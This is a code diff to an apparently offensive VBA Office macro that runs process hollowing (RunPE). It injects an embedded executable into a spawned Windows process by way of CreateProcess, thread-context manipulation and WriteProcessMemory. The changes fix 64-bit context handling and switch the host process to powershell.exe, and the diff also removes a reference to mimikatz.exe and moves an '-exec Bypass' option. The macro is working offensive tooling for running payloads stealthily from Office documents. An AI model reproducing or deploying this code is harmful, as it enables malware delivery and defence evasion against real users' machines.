@@ -15,7 +15,7 @@
 '        3. Run the macro!
 ' Tested on: - Windows 7 Pro 64 bits + Office 2016 32 bits
 '            - Windows 10 Pro 64 bits + Office 2016 64 bits
-' Credit: @hasherezade - https://github.com/hasherezade/ (RunPE written in C++  
+' Credit: @hasherezade - https://github.com/hasherezade/ (RunPE written in C++
 '   with dynamic relocations)
 ' --------------------------------------------------------------------------------
 
@@ -28,13 +28,13 @@ Option Explicit
     Private Declare PtrSafe Sub RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As LongPtr, ByVal sSource As LongPtr, ByVal lLength As Long)
     Private Declare PtrSafe Function GetModuleFileName Lib "KERNEL32" Alias "GetModuleFileNameA" (ByVal hModule As LongPtr, ByVal lpFilename As String, ByVal nSize As Long) As Long
     Private Declare PtrSafe Function CreateProcess Lib "KERNEL32" Alias "CreateProcessA" (ByVal lpApplicationName As String, ByVal lpCommandLine As String, ByVal lpProcessAttributes As LongPtr, ByVal lpThreadAttributes As LongPtr, ByVal bInheritHandles As Boolean, ByVal dwCreationFlags As Long, ByVal lpEnvironment As LongPtr, ByVal lpCurrentDirectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long
-    Private Declare PtrSafe Function GetThreadContext Lib "KERNEL32" (ByVal hThread As LongPtr, lpContext As CONTEXT) As Long
+    Private Declare PtrSafe Function GetThreadContext Lib "KERNEL32" (ByVal hThread As LongPtr, ByVal lpContext As LongPtr) As Long
     Private Declare PtrSafe Function ReadProcessMemory Lib "KERNEL32" (ByVal hProcess As LongPtr, ByVal lpBaseAddress As LongPtr, ByVal lpBuffer As LongPtr, ByVal nSize As Long, ByVal lpNumberOfBytesRead As LongPtr) As Long
     Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
     Private Declare PtrSafe Function VirtualAllocEx Lib "KERNEL32" (ByVal hProcess As LongPtr, ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
     Private Declare PtrSafe Function VirtualFree Lib "KERNEL32" (ByVal lpAddress As LongPtr, dwSize As Long, dwFreeType As Long) As Long
     Private Declare PtrSafe Function WriteProcessMemory Lib "KERNEL32" (ByVal hProcess As LongPtr, ByVal lpBaseAddress As LongPtr, ByVal lpBuffer As LongPtr, ByVal nSize As Long, ByVal lpNumberOfBytesWritten As LongPtr) As Long
-    Private Declare PtrSafe Function SetThreadContext Lib "KERNEL32" (ByVal hThread As LongPtr, lpContext As CONTEXT) As Long
+    Private Declare PtrSafe Function SetThreadContext Lib "KERNEL32" (ByVal hThread As LongPtr, ByVal lpContext As LongPtr) As Long
     Private Declare PtrSafe Function ResumeThread Lib "KERNEL32" (ByVal hThread As LongPtr) As Long
     Private Declare PtrSafe Function TerminateProcess Lib "KERNEL32" (ByVal hProcess As LongPtr, ByVal uExitCode As Integer) As Long
 #Else
@@ -199,8 +199,8 @@ Private Type IMAGE_SECTION_HEADER
     PointerToRawData As Long        'ULONG PointerToRawData;
     PointerToRelocations As Long    'ULONG PointerToRelocations;
     PointerToLinenumbers As Long    'ULONG PointerToLinenumbers;
-    NumberOfRelocations As Integer  'WORD NumberOfRelocations;
-    NumberOfLinenumbers As Integer  'WORD NumberOfLinenumbers;
+    NumberOfRelocations As Integer  'WORD  NumberOfRelocations;
+    NumberOfLinenumbers As Integer  'WORD  NumberOfLinenumbers;
     Characteristics As Long         'ULONG Characteristics;
 End Type
 
@@ -208,44 +208,66 @@ End Type
 Private Type PROCESS_INFORMATION
     hProcess As LongPtr     'HANDLE hProcess;
     hThread As LongPtr      'HANDLE hThread;
-    dwProcessId As Long     'DWORD dwProcessId;
-    dwThreadId As Long      'DWORD dwThreadId;
+    dwProcessId As Long     'DWORD  dwProcessId;
+    dwThreadId As Long      'DWORD  dwThreadId;
 End Type
 
 ' https://msdn.microsoft.com/en-us/library/windows/desktop/ms686331(v=vs.85).aspx
 Private Type STARTUPINFO
-    cb As Long                  'DWORD   cb;
-    lpReserved As String        'LPSTR   lpReserved;
-    lpDesktop As String         'LPSTR   lpDesktop;
-    lpTitle As String           'LPSTR   lpTitle;
-    dwX As Long                 'DWORD   dwX;
-    dwY As Long                 'DWORD   dwY;
-    dwXSize As Long             'DWORD   dwXSize;
-    dwYSize As Long             'DWORD   dwYSize;
-    dwXCountChars As Long       'DWORD   dwXCountChars;
-    dwYCountChars As Long       'DWORD   dwYCountChars;
-    dwFillAttribute As Long     'DWORD   dwFillAttribute;
-    dwFlags As Long             'DWORD   dwFlags;
-    wShowWindow As Integer      'WORD    wShowWindow;
-    cbReserved2 As Integer      'WORD    cbReserved2;
-    lpReserved2 As LongPtr      'LPBYTE  lpReserved2;
-    hStdInput As LongPtr        'HANDLE  hStdInput;
-    hStdOutput As LongPtr       'HANDLE  hStdOutput;
-    hStdError As LongPtr        'HANDLE  hStdError;
+    cb As Long                  'DWORD  cb;
+    lpReserved As String        'LPSTR  lpReserved;
+    lpDesktop As String         'LPSTR  lpDesktop;
+    lpTitle As String           'LPSTR  lpTitle;
+    dwX As Long                 'DWORD  dwX;
+    dwY As Long                 'DWORD  dwY;
+    dwXSize As Long             'DWORD  dwXSize;
+    dwYSize As Long             'DWORD  dwYSize;
+    dwXCountChars As Long       'DWORD  dwXCountChars;
+    dwYCountChars As Long       'DWORD  dwYCountChars;
+    dwFillAttribute As Long     'DWORD  dwFillAttribute;
+    dwFlags As Long             'DWORD  dwFlags;
+    wShowWindow As Integer      'WORD   wShowWindow;
+    cbReserved2 As Integer      'WORD   cbReserved2;
+    lpReserved2 As LongPtr      'LPBYTE lpReserved2;
+    hStdInput As LongPtr        'HANDLE hStdInput;
+    hStdOutput As LongPtr       'HANDLE hStdOutput;
+    hStdError As LongPtr        'HANDLE hStdError;
 End Type
 
 ' https://www.nirsoft.net/kernel_struct/vista/FLOATING_SAVE_AREA.html
 Private Type FLOATING_SAVE_AREA
-    ControlWord As Long                                 'DWORD   ControlWord;
-    StatusWord As Long                                  'DWORD   StatusWord;
-    TagWord As Long                                     'DWORD   TagWord;
-    ErrorOffset As Long                                 'DWORD   ErrorOffset;
-    ErrorSelector As Long                               'DWORD   ErrorSelector;
-    DataOffset As Long                                  'DWORD   DataOffset;
-    DataSelector As Long                                'DWORD   DataSelector;
-    RegisterArea(SIZE_OF_80387_REGISTERS - 1) As Byte   'BYTE    RegisterArea[SIZE_OF_80387_REGISTERS];
-    Spare0 As Long                                      'DWORD   Spare0;
+    ControlWord As Long                                 'DWORD ControlWord;
+    StatusWord As Long                                  'DWORD StatusWord;
+    TagWord As Long                                     'DWORD TagWord;
+    ErrorOffset As Long                                 'DWORD ErrorOffset;
+    ErrorSelector As Long                               'DWORD ErrorSelector;
+    DataOffset As Long                                  'DWORD DataOffset;
+    DataSelector As Long                                'DWORD DataSelector;
+    RegisterArea(SIZE_OF_80387_REGISTERS - 1) As Byte   'BYTE  RegisterArea[SIZE_OF_80387_REGISTERS];
+    Spare0 As Long                                      'DWORD Spare0;
 End Type
+
+' winnt.h
+#If Win64 Then
+    Private Type XMM_SAVE_AREA32
+        ControlWord As Integer                  'WORD  ControlWord;
+        StatusWord As Integer                   'WORD  StatusWord;
+        TagWord As Byte                         'BYTE  TagWord;
+        Reserved1 As Byte                       'BYTE  Reserved1;
+        ErrorOpcode As Integer                  'WORD  ErrorOpcode;
+        ErrorOffset As Long                     'DWORD ErrorOffset;
+        ErrorSelector As Integer                'WORD  ErrorSelector;
+        Reserved2 As Integer                    'WORD  Reserved2;
+        DataOffset As Long                      'DWORD DataOffset;
+        DataSelector As Integer                 'WORD  DataSelector;
+        Reserved3 As Integer                    'WORD  Reserved3;
+        MxCsr As Long                           'DWORD MxCsr;
+        MxCsr_Mask As Long                      'DWORD MxCsr_Mask;
+        FloatRegisters(8 - 1) As M128A          'M128A FloatRegisters[8];
+        XmmRegisters(16 - 1) As M128A       'M128A XmmRegisters[16];
+        Reserved4(96 - 1) As Byte           'BYTE  Reserved4[96];
+End Type
+#End If
 
 Private Type CONTEXT
     #If Win64 Then
@@ -266,7 +288,7 @@ Private Type CONTEXT
         SegFs As Integer                    'WORD   SegFs;
         SegGs As Integer                    'WORD   SegGs;
         SegSs As Integer                    'WORD   SegSs;
-        EFlags As Long                      'DWORD EFlags;
+        EFlags As Long                      'DWORD  EFlags;
         ' Debug registers
         Dr0 As LongLong                     'DWORD64 Dr0;
         Dr1 As LongLong                     'DWORD64 Dr1;
@@ -294,26 +316,27 @@ Private Type CONTEXT
         ' Program counter
         Rip As LongLong                     'DWORD64 Rip
         ' Floating point state
-        Header(2 - 1) As M128A              'M128A Header[2];
-        Legacy(8 - 1) As M128A              'M128A Legacy[8];
-        Xmm0 As M128A                       'M128A Xmm0;
-        Xmm1 As M128A                       'M128A Xmm1;
-        Xmm2 As M128A                       'M128A Xmm2;
-        Xmm3 As M128A                       'M128A Xmm3;
-        Xmm4 As M128A                       'M128A Xmm4;
-        Xmm5 As M128A                       'M128A Xmm5;
-        Xmm6 As M128A                       'M128A Xmm6;
-        Xmm7 As M128A                       'M128A Xmm7;
-        Xmm8 As M128A                       'M128A Xmm8;
-        Xmm9 As M128A                       'M128A Xmm9;
-        Xmm10 As M128A                      'M128A Xmm10;
-        Xmm11 As M128A                      'M128A Xmm11;
-        Xmm12 As M128A                      'M128A Xmm12;
-        Xmm13 As M128A                      'M128A Xmm13;
-        Xmm14 As M128A                      'M128A Xmm14;
-        Xmm15 As M128A                      'M128A Xmm15;
+        FltSave As XMM_SAVE_AREA32          'XMM_SAVE_AREA32 FltSave;
+        'Header(2 - 1) As M128A              'M128A Header[2];
+        'Legacy(8 - 1) As M128A              'M128A Legacy[8];
+        'Xmm0 As M128A                       'M128A Xmm0;
+        'Xmm1 As M128A                       'M128A Xmm1;
+        'Xmm2 As M128A                       'M128A Xmm2;
+        'Xmm3 As M128A                       'M128A Xmm3;
+        'Xmm4 As M128A                       'M128A Xmm4;
+        'Xmm5 As M128A                       'M128A Xmm5;
+        'Xmm6 As M128A                       'M128A Xmm6;
+        'Xmm7 As M128A                       'M128A Xmm7;
+        'Xmm8 As M128A                       'M128A Xmm8;
+        'Xmm9 As M128A                       'M128A Xmm9;
+        'Xmm10 As M128A                      'M128A Xmm10;
+        'Xmm11 As M128A                      'M128A Xmm11;
+        'Xmm12 As M128A                      'M128A Xmm12;
+        'Xmm13 As M128A                      'M128A Xmm13;
+        'Xmm14 As M128A                      'M128A Xmm14;
+        'Xmm15 As M128A                      'M128A Xmm15;
         ' Vector registers
-        VectorRegister(26 - 1) As M128A     'M128A VectorRegister[26];
+        VectorRegister(26 - 1) As M128A     'M128A   VectorRegister[26];
         VectorControl As LongLong           'DWORD64 VectorControl;
         ' Special debug control registers
         DebugControl As LongLong            'DWORD64 DebugControl;
@@ -324,29 +347,29 @@ Private Type CONTEXT
     #Else
         ' https://msdn.microsoft.com/en-us/library/windows/desktop/ms679284(v=vs.85).aspx
         ContextFlags As Long                'DWORD ContextFlags;
-        Dr0 As Long                         'DWORD   Dr0;
-        Dr1 As Long                         'DWORD   Dr1;
-        Dr2 As Long                         'DWORD   Dr2;
-        Dr3 As Long                         'DWORD   Dr3;
-        Dr6 As Long                         'DWORD   Dr6;
-        Dr7 As Long                         'DWORD   Dr7;
+        Dr0 As Long                         'DWORD Dr0;
+        Dr1 As Long                         'DWORD Dr1;
+        Dr2 As Long                         'DWORD Dr2;
+        Dr3 As Long                         'DWORD Dr3;
+        Dr6 As Long                         'DWORD Dr6;
+        Dr7 As Long                         'DWORD Dr7;
         FloatSave As FLOATING_SAVE_AREA     'FLOATING_SAVE_AREA FloatSave;
-        SegGs As Long                       'DWORD   SegGs;
-        SegFs As Long                       'DWORD   SegFs;
-        SegEs As Long                       'DWORD   SegEs;
-        SegDs As Long                       'DWORD   SegDs;
-        Edi As Long                         'DWORD   Edi;
-        Esi As Long                         'DWORD   Esi;
-        Ebx As Long                         'DWORD   Ebx;
-        Edx As Long                         'DWORD   Edx;
-        Ecx As Long                         'DWORD   Ecx;
-        Eax As Long                         'DWORD   Eax;
-        Ebp As Long                         'DWORD   Ebp;
-        Eip As Long                         'DWORD   Eip;
-        SegCs As Long                       'DWORD   SegCs;  // MUST BE SANITIZED
-        EFlags As Long                      'DWORD   EFlags; // MUST BE SANITIZED
-        Esp As Long                         'DWORD   Esp;
-        SegSs As Long                       'DWORD   SegSs;
+        SegGs As Long                       'DWORD SegGs;
+        SegFs As Long                       'DWORD SegFs;
+        SegEs As Long                       'DWORD SegEs;
+        SegDs As Long                       'DWORD SegDs;
+        Edi As Long                         'DWORD Edi;
+        Esi As Long                         'DWORD Esi;
+        Ebx As Long                         'DWORD Ebx;
+        Edx As Long                         'DWORD Edx;
+        Ecx As Long                         'DWORD Ecx;
+        Eax As Long                         'DWORD Eax;
+        Ebp As Long                         'DWORD Ebp;
+        Eip As Long                         'DWORD Eip;
+        SegCs As Long                       'DWORD SegCs;  // MUST BE SANITIZED
+        EFlags As Long                      'DWORD EFlags; // MUST BE SANITIZED
+        Esp As Long                         'DWORD Esp;
+        SegSs As Long                       'DWORD SegSs;
         ExtendedRegisters(MAXIMUM_SUPPORTED_EXTENSION - 1) As Byte 'BYTE    ExtendedRegisters[MAXIMUM_SUPPORTED_EXTENSION];
     #End If
 End Type
@@ -631,12 +654,21 @@ Public Sub RunPE(ByRef baImage() As Byte, strArguments As String)
     Dim structContext As CONTEXT
     structContext.ContextFlags = CONTEXT_INTEGER 'CONTEXT_FULL
     Dim lGetThreadContext As Long
-    lGetThreadContext = GetThreadContext(structProcessInformation.hThread, structContext)
+    #If Win64 Then
+        Dim baContext(0 To (LenB(structContext) - 1)) As Byte
+        Call RtlMoveMemory(VarPtr(baContext(0)), VarPtr(structContext), LenB(structContext))
+        lGetThreadContext = GetThreadContext(structProcessInformation.hThread, VarPtr(baContext(0)))
+    #Else
+        lGetThreadContext = GetThreadContext(structProcessInformation.hThread, structContext)
+    #End If
     If lGetThreadContext = 0 Then
-        Debug.Print ("    |__ GetThreadContext() failed (Err: " + Str(Err.LastDllError) + ")")
+        Debug.Print ("    |__ GetThreadContext() failed (Err:" + Str(Err.LastDllError) + ")")
         Call TerminateProcess(structProcessInformation.hProcess, 0)
         Exit Sub
     Else
+        #If Win64 Then
+            Call RtlMoveMemory(VarPtr(structContext), VarPtr(baContext(0)), LenB(structContext))
+        #End If
         If VERBOSE Then
             Debug.Print ("    |__ GetThreadContext() OK")
         End If
@@ -901,7 +933,12 @@ Public Sub RunPE(ByRef baImage() As Byte, strArguments As String)
     End If
     
     Dim lSetThreadContext As Long
-    lSetThreadContext = SetThreadContext(structProcessInformation.hThread, structContext)
+    #If Win64 Then
+        Call RtlMoveMemory(VarPtr(baContext(0)), VarPtr(structContext), LenB(structContext))
+        lSetThreadContext = SetThreadContext(structProcessInformation.hThread, VarPtr(baContext(0)))
+    #Else
+        lSetThreadContext = SetThreadContext(structProcessInformation.hThread, structContext)
+    #End If
     If lSetThreadContext = 0 Then
         Debug.Print ("    |__ SetThreadContext() failed (Err:" + Str(Err.LastDllError) + ")")
         Call TerminateProcess(structProcessInformation.hProcess, 0)
@@ -949,15 +986,14 @@ Public Sub Exploit()
     Dim strSrcArguments As String
     Dim strSrcPE As String
     
-    strSrcFile = "C:\Windows\System32\cmd.exe"
-    'strSrcFile = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
-    'strSrcFile = "C:\Users\clement\Downloads\Win32\mimikatz.exe"
+    'strSrcFile = "C:\Windows\System32\cmd.exe"
+    strSrcFile = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
     
     'strSrcFile = "C:\Windows\SysWOW64\cmd.exe"
     'strSrcFile = "C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe"
     
-    'strSrcArguments = "-exec Bypass"
     strSrcArguments = ""
+    'strSrcArguments = "-exec Bypass"
     
     strSrcPE = PE()
     If strSrcPE = "" Then
